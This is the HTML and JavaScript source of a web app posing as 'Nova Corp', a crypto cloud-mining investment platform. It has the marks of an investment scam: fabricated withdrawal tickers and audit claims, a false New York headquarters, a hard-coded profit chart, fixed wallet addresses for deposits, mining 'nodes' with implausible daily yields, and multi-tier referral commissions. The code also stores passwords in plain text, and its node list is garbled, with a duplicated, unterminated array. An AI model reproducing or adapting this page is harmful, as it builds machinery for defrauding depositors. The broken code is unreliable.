<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA CORP | International Mining Enterprise</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --bg: #F8FAFC; --card: #FFFFFF; }
        body { background: var(--bg); font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; overflow-x: hidden; scroll-behavior: smooth; }
        
        .premium-card { background: var(--card); border: 1px solid #e2e8f0; border-radius: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.02); }
        .btn-gold { background: linear-gradient(135deg, #D4AF37, #B8860B); color: white; border-radius: 14px; font-weight: 800; transition: 0.3s; box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3); text-align: center; }
        .btn-gold:active { transform: scale(0.96); }

        /* Floating Support */
        .support-float { position: fixed; bottom: 100px; right: 20px; background: #25D366; color: white; width: 55px; height: 55px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 30px rgba(37, 211, 102, 0.3); z-index: 999; }

        /* Ticker */
        .ticker-wrap { background: #0f172a; color: white; padding: 12px 0; overflow: hidden; }
        .ticker { display: inline-block; white-space: nowrap; animation: ticker 40s linear infinite; font-size: 10px; font-weight: 800; letter-spacing: 1px; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        .screen { display: none; animation: slideIn 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
        .active-screen { display: block; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }

        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(15px); border-top: 1px solid #e2e8f0; display: flex; justify-content: space-around; padding: 15px 10px; z-index: 1000; }
        .nav-item { color: #94a3b8; font-size: 9px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; }
        .nav-item.active { color: var(--gold); }
    </style>
</head>
<body>

    <div class="ticker-wrap">
        <div class="ticker uppercase">
            ⚡ User @Am***7 just withdrew $840.00 • 🚀 New Gold Node activated in London • 💎 Network Hashrate: 124.5 PH/s • ✅ Audit Status: Verified by Certik • ⚡ User @Ka***9 just withdrew $120.50 • 🔥 Total Active Miners: 45,821
        </div>
    </div>

    <div id="auth-screen" class="active-screen">
        <section class="p-8 text-center bg-white border-b">
            <h1 class="text-5xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[10px] text-slate-400 font-bold uppercase tracking-[10px] mt-2 mb-8">Quantum Mining Hub</p>
            <div class="space-y-4 max-w-sm mx-auto">
                <input type="text" id="u-id" placeholder="Username / Partner ID" class="w-full p-4 border-2 border-slate-100 rounded-2xl outline-none focus:border-[#D4AF37]">
                <input type="password" id="u-pw" placeholder="Security Password" class="w-full p-4 border-2 border-slate-100 rounded-2xl outline-none focus:border-[#D4AF37]">
                <div id="adm-box" class="hidden"><input type="password" id="adm-key" placeholder="ADMIN MASTER KEY" class="w-full p-4 border-red-200 border-2 rounded-2xl"></div>
                <button onclick="handleAuth()" class="w-full btn-gold py-5 uppercase tracking-widest text-sm">Authorize Session</button>
                <p onclick="toggleMode()" id="mode-text" class="text-center text-[10px] text-slate-400 font-black uppercase mt-4 cursor-pointer">Register New Account</p>
            </div>
        </section>

        <section class="p-8 space-y-10 bg-slate-50 pb-20">
            <div class="text-center">
                <h3 class="text-xs font-black text-[#D4AF37] uppercase tracking-[4px] mb-2">Our Company</h3>
                <h2 class="text-2xl font-black text-slate-900">Why Trust Nova Corp?</h2>
            </div>
            
            <div class="grid grid-cols-1 gap-6">
                <div class="premium-card p-6 border-l-4 border-[#D4AF37]">
                    <i class="fa-solid fa-building-shield text-2xl text-[#D4AF37] mb-4"></i>
                    <h4 class="font-black text-sm uppercase">Licensed Entity</h4>
                    <p class="text-xs text-slate-500 mt-2 leading-relaxed">Nova Corp is a registered digital infrastructure provider specialized in SHA-256 and Scrypt mining technologies since 2018.</p>
                </div>
                <div class="premium-card p-6 border-l-4 border-blue-500">
                    <i class="fa-solid fa-location-dot text-2xl text-blue-500 mb-4"></i>
                    <h4 class="font-black text-sm uppercase">Global Presence</h4>
                    <p class="text-xs text-slate-500 mt-2">Headquarters: One World Trade Center, New York, NY 10007, USA. Data centers located in Iceland and Georgia.</p>
                </div>
                <div class="premium-card p-6 border-l-4 border-green-500">
                    <i class="fa-solid fa-lock text-2xl text-green-500 mb-4"></i>
                    <h4 class="font-black text-sm uppercase">Secure Assets</h4>
                    <p class="text-xs text-slate-500 mt-2">100% of user funds are stored in cold wallets. Regular security audits by independent blockchain firms.</p>
                </div>
            </div>
        </section>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white border-b border-slate-100 sticky top-0 z-50">
            <h2 id="logo-trigger" class="font-black text-2xl tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="flex gap-3 items-center">
                <div class="text-[10px] font-bold text-green-500 bg-green-50 px-3 py-1 rounded-full uppercase tracking-tighter">Verified Network</div>
                <div id="user-tag" class="text-[9px] font-black bg-slate-900 text-white px-4 py-2 rounded-full uppercase">@USER</div>
            </div>
        </header>

        <div id="page-dash" class="screen active-screen px-4 pt-6 pb-24">
            <div class="flex gap-2 overflow-x-auto pb-4 no-scrollbar">
                <div class="premium-card p-3 min-w-[130px] flex justify-between items-center">
                    <span class="text-[10px] font-black text-slate-400">BTC</span>
                    <span class="text-[10px] text-green-600 font-black">$64,520</span>
                </div>
                <div class="premium-card p-3 min-w-[130px] flex justify-between items-center">
                    <span class="text-[10px] font-black text-slate-400">ETH</span>
                    <span class="text-[10px] text-green-600 font-black">$3,421</span>
                </div>
                <div class="premium-card p-3 min-w-[130px] flex justify-between items-center">
                    <span class="text-[10px] font-black text-slate-400">USDT</span>
                    <span class="text-[10px] text-slate-400 font-black">$1.00</span>
                </div>
            </div>

            <div class="bg-slate-900 rounded-[35px] p-8 mb-6 text-white shadow-2xl relative overflow-hidden">
                <div class="absolute -right-10 -top-10 w-40 h-40 bg-white/5 rounded-full"></div>
                <p class="text-[10px] text-slate-400 font-black uppercase tracking-[4px] mb-2">Account Balance</p>
                <h1 id="b-main" class="text-5xl font-black tracking-tighter mb-10">$0.00</h1>
                <div class="grid grid-cols-2 gap-4 border-t border-white/10 pt-6">
                    <div><p class="text-[9px] text-slate-500 uppercase font-bold">Daily Profit</p><p id="b-daily" class="text-xl font-black text-green-400">+$0.00</p></div>
                    <div class="text-right"><p class="text-[9px] text-slate-500 uppercase font-bold">Total Earnings</p><p id="b-total" class="text-xl font-black text-[#D4AF37]">$0.00</p></div>
                </div>
            </div>

            <div class="premium-card p-6 mb-6">
                <h4 class="text-[10px] font-black uppercase mb-4 text-slate-400">Mining Performance (7D)</h4>
                <canvas id="profitChart" height="150"></canvas>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="openModal('modal-dep')" class="premium-card p-6 flex flex-col items-center gap-3"><i class="fa-solid fa-plus text-2xl text-[#D4AF37]"></i><span class="text-[11px] font-black uppercase">Add Funds</span></button>
                <button onclick="openModal('modal-wd')" class="premium-card p-6 flex flex-col items-center gap-3"><i class="fa-solid fa-arrow-up-right-from-square text-2xl text-slate-400"></i><span class="text-[11px] font-black uppercase">Withdraw</span></button>
            </div>

            <div class="premium-card p-6 mb-6">
                <h4 class="text-[11px] font-black uppercase mb-3 text-slate-900">Affiliate Program</h4>
                <div class="flex gap-2 mb-4">
                    <input type="text" id="ref-link" value="https://nova.corp/?ref=user" class="flex-1 bg-slate-50 border-none p-4 rounded-xl text-[10px] font-bold outline-none" readonly>
                    <button onclick="copyRef()" class="bg-slate-900 text-white px-6 rounded-xl text-[10px] font-black">COPY</button>
                </div>
                <div class="grid grid-cols-3 gap-2">
                    <div class="text-center bg-slate-50 p-2 rounded-xl border border-slate-100"><p class="text-[8px] text-slate-400 uppercase">Tier 1</p><p class="text-[11px] font-black text-[#D4AF37]">12%</p></div>
                    <div class="text-center bg-slate-50 p-2 rounded-xl border border-slate-100"><p class="text-[8px] text-slate-400 uppercase">Tier 2</p><p class="text-[11px] font-black text-[#D4AF37]">5%</p></div>
                    <div class="text-center bg-slate-50 p-2 rounded-xl border border-slate-100"><p class="text-[8px] text-slate-400 uppercase">Tier 3</p><p class="text-[11px] font-black text-[#D4AF37]">2%</p></div>
                </div>
            </div>

            <div class="flex justify-center gap-8 opacity-20 grayscale py-10">
                <i class="fa-brands fa-cc-visa text-3xl"></i>
                <i class="fa-brands fa-cc-mastercard text-3xl"></i>
                <i class="fa-brands fa-bitcoin text-3xl"></i>
                <i class="fa-solid fa-shield-virus text-3xl"></i>
            </div>
        </div>

        <div id="page-nodes" class="screen px-4 pt-6 pb-24">
            <h2 class="text-2xl font-black mb-8 uppercase tracking-tighter">Mining <span class="text-[#D4AF37]">Infrastructure</span></h2>
            <div id="nodes-grid" class="grid grid-cols-1 gap-6"></div>
        </div>

        <div id="page-logs" class="screen px-4 pt-6 pb-24">
            <h2 class="text-2xl font-black mb-8 uppercase">Blockchain <span class="text-[#D4AF37]">Ledger</span></h2>
            <div id="logs-list" class="space-y-4"></div>
        </div>

        <a href="https://t.me/your_official_support" class="support-float"><i class="fa-brands fa-telegram text-2xl"></i></a>

        <nav class="nav-bar">
            <div onclick="nav('page-dash', this)" class="nav-item active"><i class="fa-solid fa-layer-group text-xl"></i><span>DASHBOARD</span></div>
            <div onclick="nav('page-nodes', this)" class="nav-item"><i class="fa-solid fa-microchip text-xl"></i><span>NODES</span></div>
            <div onclick="nav('page-logs', this)" class="nav-item"><i class="fa-solid fa-clock-rotate-left text-xl"></i><span>HISTORY</span></div>
            <div onclick="logout()" class="nav-item"><i class="fa-solid fa-power-off text-xl text-red-400"></i><span>LOGOUT</span></div>
        </nav>
    </div>

    <div id="modal-dep" class="fixed inset-0 bg-white z-[2000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="text-3xl font-black">FUNDING</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-xmark text-3xl"></i></div>
        <div class="space-y-4 mb-10">
            <div class="premium-card p-6 border-l-4 border-blue-600 bg-blue-50/20">
                <p class="text-[10px] font-black text-blue-600 uppercase mb-2">Option 1: Trust Wallet (BEP20)</p>
                <p class="text-[12px] font-mono font-bold break-all">0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37</p>
                <button onclick="copy('0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37')" class="mt-4 text-[10px] font-black underline text-blue-700">COPY ADDRESS</button>
            </div>
            <div class="premium-card p-6 border-l-4 border-orange-600 bg-orange-50/20">
                <p class="text-[10px] font-black text-orange-600 uppercase mb-2">Option 2: MetaMask (BEP20)</p>
                <p class="text-[12px] font-mono font-bold break-all">0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2</p>
                <button onclick="copy('0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2')" class="mt-4 text-[10px] font-black underline text-orange-700">COPY ADDRESS</button>
            </div>
        </div>
        <input type="number" id="in-amt" placeholder="Deposit Amount (USDT)" class="w-full p-5 border-2 border-slate-100 rounded-2xl mb-4 outline-none">
        <input type="text" id="in-ref" placeholder="Transaction Hash / ID" class="w-full p-5 border-2 border-slate-100 rounded-2xl mb-6 outline-none">
        <button onclick="submitFin('Deposit')" class="w-full btn-gold py-6 text-sm uppercase">Verify Payment</button>
    </div>

    <div id="modal-wd" class="fixed inset-0 bg-white z-[2000] p-8 hidden">
        <div class="flex justify-between items-center mb-8"><h2 class="text-3xl font-black">WITHDRAW</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-xmark text-3xl"></i></div>
        <input type="number" id="out-amt" placeholder="Payout Amount" class="w-full p-5 border-2 border-slate-100 rounded-2xl mb-4 outline-none">
        <input type="text" id="out-addr" placeholder="Destination Wallet Address" class="w-full p-5 border-2 border-slate-100 rounded-2xl mb-6 outline-none">
        <button onclick="submitFin('Withdrawal')" class="w-full btn-gold py-6 bg-slate-900 !text-white text-sm uppercase">Request Extraction</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
        let user = localStorage.getItem('nova_user'); let isLogin = true;

        if(user) startApp(user);

        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(!id || !pw) return alert("Fill credentials");
            const uR = doc(db, "users", id); const s = await getDoc(uR);
            if(isLogin) {
                if(s.exists() && s.data().password === pw) { localStorage.setItem('nova_user', id); startApp(id); }
                else alert("Invalid Access Key");
            } else {
                if(s.exists()) return alert("Username taken");
                await setDoc(uR, { balance: 0, password: pw, daily: 0, total_profit: 0, active_nodes: [] });
                localStorage.setItem('nova_user', id); startApp(id);
            }
        };

        function startApp(id) {
            document.getElementById('auth-screen').style.display='none'; document.getElementById('app').classList.remove('hidden');
            document.getElementById('user-tag').innerText = `@${id.toUpperCase()}`;
            document.getElementById('ref-link').value = `https://nova.corp/?partner=${id}`;
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                document.getElementById('b-main').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('b-daily').innerText = "+$" + (data.daily || 0).toFixed(2);
                document.getElementById('b-total').innerText = "$" + (data.total_profit || 0).toFixed(2);
                genNodes(data.active_nodes || []);
            });
            initChart();
            loadLogs();
        }

        function initChart() {
            const ctx = document.getElementById('profitChart').getContext('2d');
            new Chart(ctx, {
                type: 'line',
                data: {
                    labels: ['M', 'T', 'W', 'T', 'F', 'S', 'S'],
                    datasets: [{ label: 'Profit', data: [5, 12, 10, 18, 25, 20, 35], borderColor: '#D4AF37', tension: 0.4, fill: true, backgroundColor: 'rgba(212, 175, 55, 0.05)' }]
                },
                options: { plugins: { legend: { display: false } }, scales: { y: { display: false }, x: { grid: { display: false } } } }
            });
        }

        const nodes = [
        const nodesData = [
    { id: 1, name: "Nano Core V1", cost: 20, yield: 1.5, hashrate: "1.2 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1591844339942-3064e9042ce5?q=80&w=400" },
    { id: 2, name: "Neon Bit 2.0", cost: 50, yield: 4.2, hashrate: "3.5 TH/s", algorithm: "Scrypt", img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc51?q=80&w=400" },
    { id: 3, name: "Bronze Rig X", cost: 100, yield: 9.0, hashrate: "8.2 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?q=80&w=400" },
    { id: 4, name: "Cobalt Miner", cost: 200, yield: 18.5, hashrate: "15.0 TH/s", algorithm: "EtHash", img: "https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=400" },
    { id: 5, name: "Silver Hub Pro", cost: 500, yield: 48.0, hashrate: "42.5 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1620712943543-bcc4688e7485?q=80&w=400" },
    { id: 6, name: "Viper Blade", cost: 750, yield: 72.0, hashrate: "68.0 TH/s", algorithm: "Scrypt", img: "https://images.unsplash.com/photo-1591844339942-3064e9042ce5?q=80&w=400" },
    { id: 7, name: "Gold Processor", cost: 1000, yield: 110.0, hashrate: "95.0 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1639322537523-abaea1ec960c?q=80&w=400" },
    { id: 8, name: "Titan X-500", cost: 1500, yield: 165.0, hashrate: "140.0 TH/s", algorithm: "EtHash", img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc51?q=80&w=400" },
    { id: 9, name: "Apex Master", cost: 2000, yield: 220.0, hashrate: "195.0 TH/s", algorithm: "Multi-Algo", img: "https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=400" },
    { id: 10, name: "Nova Storm", cost: 2500, yield: 280.0, hashrate: "250.0 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1620712943543-bcc4688e7485?q=80&w=400" },
    { id: 11, name: "Zenith Node", cost: 3000, yield: 340.0, hashrate: "310.0 TH/s", algorithm: "Quantum-S", img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?q=80&w=400" },
    { id: 12, name: "Raptor Cluster", cost: 4000, yield: 460.0, hashrate: "420.0 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1591844339942-3064e9042ce5?q=80&w=400" },
    { id: 13, name: "Orion Server", cost: 5000, yield: 580.0, hashrate: "510.0 TH/s", algorithm: "EtHash", img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc51?q=80&w=400" },
    { id: 14, name: "Kraken Rig", cost: 7000, yield: 820.0, hashrate: "750.0 TH/s", algorithm: "Scrypt", img: "https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=400" },
    { id: 15, name: "Empire Blade", cost: 8500, yield: 1050.0, hashrate: "920.0 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1620712943543-bcc4688e7485?q=80&w=400" },
    { id: 16, name: "Nebula Core", cost: 10000, yield: 1250.0, hashrate: "1.2 PH/s", algorithm: "Quantum-X", img: "https://images.unsplash.com/photo-1639322537523-abaea1ec960c?q=80&w=400" const nodesData = [
    { id: 1, name: "Nano Core V1", cost: 20, yield: 1.5, hashrate: "1.2 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1591844339942-3064e9042ce5?q=80&w=400" },
    { id: 2, name: "Neon Bit 2.0", cost: 50, yield: 4.2, hashrate: "3.5 TH/s", algorithm: "Scrypt", img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc51?q=80&w=400" },
    { id: 3, name: "Bronze Rig X", cost: 100, yield: 9.0, hashrate: "8.2 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?q=80&w=400" },
    { id: 4, name: "Cobalt Miner", cost: 200, yield: 18.5, hashrate: "15.0 TH/s", algorithm: "EtHash", img: "https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=400" },
    { id: 5, name: "Silver Hub Pro", cost: 500, yield: 48.0, hashrate: "42.5 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1620712943543-bcc4688e7485?q=80&w=400" },
    { id: 6, name: "Viper Blade", cost: 750, yield: 72.0, hashrate: "68.0 TH/s", algorithm: "Scrypt", img: "https://images.unsplash.com/photo-1591844339942-3064e9042ce5?q=80&w=400" },
    { id: 7, name: "Gold Processor", cost: 1000, yield: 110.0, hashrate: "95.0 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1639322537523-abaea1ec960c?q=80&w=400" },
    { id: 8, name: "Titan X-500", cost: 1500, yield: 165.0, hashrate: "140.0 TH/s", algorithm: "EtHash", img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc51?q=80&w=400" },
    { id: 9, name: "Apex Master", cost: 2000, yield: 220.0, hashrate: "195.0 TH/s", algorithm: "Multi-Algo", img: "https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=400" },
    { id: 10, name: "Nova Storm", cost: 2500, yield: 280.0, hashrate: "250.0 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1620712943543-bcc4688e7485?q=80&w=400" },
    { id: 11, name: "Zenith Node", cost: 3000, yield: 340.0, hashrate: "310.0 TH/s", algorithm: "Quantum-S", img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?q=80&w=400" },
    { id: 12, name: "Raptor Cluster", cost: 4000, yield: 460.0, hashrate: "420.0 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1591844339942-3064e9042ce5?q=80&w=400" },
    { id: 13, name: "Orion Server", cost: 5000, yield: 580.0, hashrate: "510.0 TH/s", algorithm: "EtHash", img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc51?q=80&w=400" },
    { id: 14, name: "Kraken Rig", cost: 7000, yield: 820.0, hashrate: "750.0 TH/s", algorithm: "Scrypt", img: "https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=400" },
    { id: 15, name: "Empire Blade", cost: 8500, yield: 1050.0, hashrate: "920.0 TH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1620712943543-bcc4688e7485?q=80&w=400" },
    { id: 16, name: "Nebula Core", cost: 10000, yield: 1250.0, hashrate: "1.2 PH/s", algorithm: "Quantum-X", img: "https://images.unsplash.com/photo-1639322537523-abaea1ec960c?q=80&w=400" },
    { id: 17, name: "Galaxy Miner", cost: 12500, yield: 1600.0, hashrate: "1.8 PH/s", algorithm: "Multi-Chain", img: "https://images.unsplash.com/photo-1591844339942-3064e9042ce5?q=80&w=400" },
    { id: 18, name: "Infinity Node", cost: 15000, yield: 1950.0, hashrate: "2.5 PH/s", algorithm: "SHA-256", img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc51?q=80&w=400" },
    { id: 19, name: "Omni Pro", cost: 20000, yield: 2700.0, hashrate: "3.2 PH/s", algorithm: "EtHash", img: "https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=400" },
    { id: 20, name: "Quantum Nexus", cost: 25000, yield: 3500.0, hashrate: "5.0 PH/s", algorithm: "Quantum-Max", img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?q=80&w=400" },
    { id: 21, name: "Nova Sovereign", cost: 30000, yield: 4300.0, hashrate: "8.5 PH/s", algorithm: "Sovereign-X", img: "https://images.unsplash.com/photo-1620712943543-bcc4688e7485?q=80&w=400" }
];        function genNodes(activeList) {
            const c = document.getElementById('nodes-grid'); c.innerHTML = "";
            nodes.forEach(n => {
                const active = activeList.find(a => a.nodeId === n.id);
                c.innerHTML += `<div class="premium-card p-6 flex justify-between items-center"><div><h4 class="font-black text-sm uppercase">${n.name}</h4><p class="text-green-500 font-bold text-[10px]">Daily: +$${n.yield.toFixed(2)}</p></div>${active ? `<div class="bg-slate-50 text-[#D4AF37] px-4 py-2 rounded-xl text-[10px] font-black border border-slate-100">RUNNING</div>` : `<button onclick="buyNode(${n.id},${n.cost},${n.yield})" class="btn-gold px-6 py-2 text-[10px] uppercase">$${n.cost}</button>`}</div>`;
            });
        }

        window.buyNode = async (id, cost, y) => {
            const uR = doc(db, "users", localStorage.getItem('nova_user')); const s = await getDoc(uR);
            if(s.data().balance < cost) return alert("Low Liquidity");
            await updateDoc(uR, { balance: s.data().balance - cost, active_nodes: [...(s.data().active_nodes || []), { nodeId: id, yield: y, lastClaim: Date.now() }], daily: (s.data().daily || 0) + y });
            alert("Mining Node Initialized!");
        };

        window.submitFin = async (t) => {
            const a = parseFloat(document.getElementById(t=='Deposit'?'in-amt':'out-amt').value);
            const r = document.getElementById(t=='Deposit'?'in-ref':'out-addr').value;
            if(!a || !r) return alert("Fill data");
            await addDoc(collection(db, "logs"), { user: localStorage.getItem('nova_user'), type: t, amount: a, status: 'Processing', ref: r, time: Date.now() });
            alert("Transmission complete! Pending Network Approval."); closeModal(t=='Deposit'?'modal-dep':'modal-wd');
        };

        function loadLogs() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", localStorage.getItem('nova_user'))), s => {
                const c = document.getElementById('logs-list'); c.innerHTML = "";
                s.forEach(doc => {
                    const l = doc.data();
                    c.innerHTML += `<div class="premium-card p-5 flex justify-between"><div><p class="text-[9px] font-black text-slate-400 uppercase">${l.type}</p><p class="text-sm font-black">$${l.amount}</p></div><span class="text-[10px] font-bold text-yellow-600">${l.status}</span></div>`;
                });
            });
        }

        window.nav = (id, el) => { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen')); document.getElementById(id).classList.add('active-screen'); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); };
        window.toggleMode = () => { isLogin = !isLogin; document.getElementById('mode-text').innerText = isLogin ? "Register New Account" : "Return to Login Portal"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.copyRef = () => { document.getElementById('ref-link').select(); document.execCommand('copy'); alert("Link Copied!"); };
        window.logout = () => { localStorage.removeItem('nova_user'); location.reload(); };
        window.copy = (t) => { navigator.clipboard.writeText(t); alert("Address Copied!"); };
    </script>
</body>
</html>
